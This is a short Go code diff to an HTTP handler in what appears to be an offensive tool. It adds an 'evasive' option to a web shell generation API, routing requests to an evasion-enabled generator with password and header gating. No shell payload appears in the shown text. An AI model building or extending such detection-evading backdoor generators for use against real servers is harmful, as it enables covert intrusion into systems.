@@ -26,7 +26,8 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 		Filename   string `json:"filename"`
 		GateHeader string `json:"gate_header"`
 		GateValue  string `json:"gate_value"`
-	}
+	
+		Evasive    bool   `json:"evasive"` }
 	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
 		writeErr(w, 400, "bad json: "+err.Error())
 		return
@@ -38,9 +39,9 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	if b.Encoder == "" {
 		b.Encoder = "raw"
 	}
-	code, err := webshell.GenerateShellOpts(b.ScriptType, b.Encoder, b.Password, webshell.GateOpts{
+	code, err := webshell.GenerateShellEvasive(b.ScriptType, b.Encoder, b.Password, webshell.GateOpts{
 		Header: b.GateHeader, Value: b.GateValue,
-	})
+	}, webshell.EvasiveOpts{Enabled: b.Evasive})
 	if err != nil {
 		writeErr(w, 400, err.Error())
 		return
